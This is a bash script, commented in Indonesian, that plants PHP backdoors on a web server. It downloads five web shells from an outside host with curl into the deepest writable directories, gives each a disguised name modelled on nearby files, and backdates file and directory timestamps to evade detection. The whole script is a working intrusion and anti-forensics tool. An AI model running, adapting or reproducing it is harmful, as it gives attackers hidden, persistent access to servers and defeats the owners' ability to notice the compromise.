#!/bin/bash
# ==============================================================
# Tools: Cari 5 direktori terdalam, upload backdoor, rename acak menyerupai file sekitar,
#        touch file ke mtime tertua di dalam dir, pulihkan mtime direktori.
# ==============================================================

# Konfigurasi
STARTDIR="${1:-.}"   # direktori awal (default: current directory)
declare -a URLS=(
    "https://makeni.org/f/9e0c06_midas.php"
    "https://makeni.org/f/de718e_lix-old.php"
    "https://makeni.org/f/e36b7a_lix.php"
    "https://makeni.org/f/7bbfab_obelix-v2.php"
    "https://makeni.org/f/6dfea9_midas-v2.php"
)

# Warna (opsional, untuk output lebih jelas)
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# --------------------------------------------------------------
# Fungsi: generate nama file yang menyerupai file-file di direktori $1
# Output: nama file unik (dengan ekstensi .php)
# --------------------------------------------------------------
generate_stealth_name() {
    local target_dir="$1"
    local ext=".php"
    local fallback_name=""
    
    # Fallback: nama random ala OC/PuS jika tidak ada file referensi
    fallback_name() {
        local chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        local len=8
        local base=""
        local i
        for ((i=0; i<len; i++)); do
            base+="${chars:RANDOM%${#chars}:1}"
        done
        local insert=""
        if (( RANDOM % 2 )); then
            insert="OC"
        else
            insert="PuS"
        fi
        local pos=$(( RANDOM % (${#base} + 1) ))
        echo "${base:0:pos}${insert}${base:pos}${ext}"
    }

    # Kumpulkan nama file (tanpa path) di target_dir (level 1, file biasa)
    local files=()
    while IFS= read -r f; do
        # Ambil basename, abaikan file hidden (opsional)
        [[ -z "$f" || "$f" =~ ^\. ]] && continue
        files+=("$f")
    done < <(find "$target_dir" -maxdepth 1 -type f -printf '%f\n' 2>/dev/null)
    
    # Jika tidak ada file sama sekali, pakai fallback
    if [[ ${#files[@]} -eq 0 ]]; then
        fallback_name
        return
    fi
    
    # Ambil 5 nama file secara acak (atau semua jika kurang)
    local sample=()
    local indices=($(shuf -i 0-$((${#files[@]}-1)) -n 5 2>/dev/null))
    for idx in "${indices[@]}"; do
        sample+=("${files[$idx]}")
    done
    # Jika shuf gagal (alpine?), pakai loop manual
    if [[ ${#sample[@]} -eq 0 ]]; then
        sample=("${files[@]:0:5}")
    fi
    
    # Pilih satu sampel secara acak
    local chosen="${sample[RANDOM % ${#sample[@]}]}"
    local base="${chosen%.*}"   # hapus ekstensi asli
    local chosen_ext="${chosen##*.}"
    
    # Strategi modifikasi nama:
    # 1. Jika nama mengandung angka, ubah satu angka terakhir atau tambah angka
    # 2. Atau tambah/double huruf vokal
    # 3. Atau tambah suffix acak 2 digit
    local new_name=""
    if [[ "$base" =~ [0-9] ]]; then
        # Ganti angka terakhir dengan angka acak
        new_name="$(echo "$base" | sed 's/[0-9]\([^0-9]*\)$/'"$((RANDOM%10))"'\1/')"
    else
        # Tambahkan dua digit angka di belakang
        new_name="${base}$((RANDOM%100))"
    fi
    
    # Pastikan nama tidak bentrok dengan file yang sudah ada
    local counter=1
    local final_name="${new_name}${ext}"
    while [[ -e "$target_dir/$final_name" ]]; do
        final_name="${new_name}_$((counter++))${ext}"
    done
    
    # Jika masih sama dengan nama asli (tanpa perubahan), tambahkan suffix
    if [[ "$final_name" == "$chosen" ]]; then
        final_name="${base}_$((RANDOM%1000))${ext}"
        counter=1
        while [[ -e "$target_dir/$final_name" ]]; do
            final_name="${base}_$((RANDOM%1000 + counter++))${ext}"
        done
    fi
    
    echo "$final_name"
}

# --------------------------------------------------------------
# Ambil 5 direktori terdalam (depth terbesar) dari STARTDIR
# --------------------------------------------------------------
echo -e "${YELLOW}Mencari 5 direktori terdalam dari $STARTDIR ...${NC}"
dirpaths=()
counter=0
while IFS= read -r -d '' entry; do
    depth="${entry%% *}"
    path="${entry#* }"
    dirpaths+=("$path")
    ((counter++))
    [[ $counter -ge 5 ]] && break
done < <(find "$STARTDIR" -type d -printf '%d %p\0' 2>/dev/null | sort -z -t ' ' -k1,1rn)

if [[ ${#dirpaths[@]} -lt 5 ]]; then
    echo -e "${RED}Hanya ditemukan ${#dirpaths[@]} direktori, minimal butuh 5. Keluar.${NC}"
    exit 1
fi

echo "Daftar 5 direktori terdalam:"
for i in "${!dirpaths[@]}"; do
    printf "%d. %s\n" $((i+1)) "${dirpaths[$i]}"
done
echo

# --------------------------------------------------------------
# Proses masing-masing direktori
# --------------------------------------------------------------
for idx in "${!dirpaths[@]}"; do
    dir="${dirpaths[$idx]}"
    url="${URLS[$idx]}"
    echo -e "${YELLOW}--- Memproses direktori ke-$((idx+1)): $dir ---${NC}"
    
    # Cek apakah direktori bisa ditulisi
    if [[ ! -w "$dir" ]]; then
        echo -e "${RED}  Tidak bisa menulis di direktori ini. Lewati.${NC}"
        continue
    fi
    
    # Simpan mtime asli direktori (epoch, integer)
    dir_mtime=$(stat -c %Y "$dir" 2>/dev/null)
    if [[ -z "$dir_mtime" ]]; then
        echo -e "${RED}  Gagal membaca mtime direktori. Lewati.${NC}"
        continue
    fi
    
    # Generate nama file yang menyerupai file sekitar
    echo -n "  Membuat nama file samaran ... "
    newfile_name=$(generate_stealth_name "$dir")
    targetpath="$dir/$newfile_name"
    echo -e "${GREEN}$newfile_name${NC}"
    
    # Download file backdoor
    echo -n "  Mendownload dari $url ... "
    if curl -s --fail --connect-timeout 10 "$url" -o "$targetpath" 2>/dev/null; then
        echo -e "${GREEN}OK${NC} ($(stat -c%s "$targetpath" 2>/dev/null) bytes)"
        echo "  File berhasil dibuat: $newfile_name"
    else
        echo -e "${RED}GAGAL${NC}"
        continue
    fi
    
    # Cari mtime tertua di antara anak langsung (file/folder) dalam direktori
    oldest_child=$(find "$dir" -mindepth 1 -maxdepth 1 -printf '%T@\n' 2>/dev/null | sort -n | head -1)
    if [[ -z "$oldest_child" ]]; then
        oldest_child="$dir_mtime"
        echo "  (tidak ada isi, gunakan mtime direktori)"
    fi
    
    # Touch file baru ke timestamp tertua
    if touch -d "@$oldest_child" "$targetpath" 2>/dev/null; then
        printf "  File di-touch ke %(%Y-%m-%d %H:%M:%S)T\n" "${oldest_child%.*}"
    else
        echo -e "${RED}  Gagal touch file.${NC}"
    fi
    
    # Kembalikan mtime direktori ke semula
    if touch -d "@$dir_mtime" "$dir" 2>/dev/null; then
        echo "  mtime direktori dipulihkan."
    else
        echo -e "${RED}  Gagal memulihkan mtime direktori.${NC}"
    fi
    echo
done

echo -e "${GREEN}Selesai.${NC}"